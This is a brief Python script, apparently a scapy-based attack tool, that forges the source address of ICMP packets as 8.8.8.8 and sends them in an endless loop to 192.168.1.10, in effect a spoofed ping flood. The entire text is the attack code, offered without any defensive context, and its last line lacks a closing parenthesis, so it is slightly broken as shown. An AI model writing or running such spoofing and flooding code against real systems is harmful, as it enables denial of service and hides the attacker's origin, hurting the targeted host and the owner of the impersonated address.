from scapy.all import IP, ICMP, send

def icmp_spoof(target_ip, spoof_ip):
    packet = IP(dst=target_ip, src=spoof_ip) / ICMP()
    send(packet, loop=1, verbose=False)

print("[INFO] Sending ICMP spoofed packets...")
icmp_spoof("192.168.1.10", "8.8.8.8"
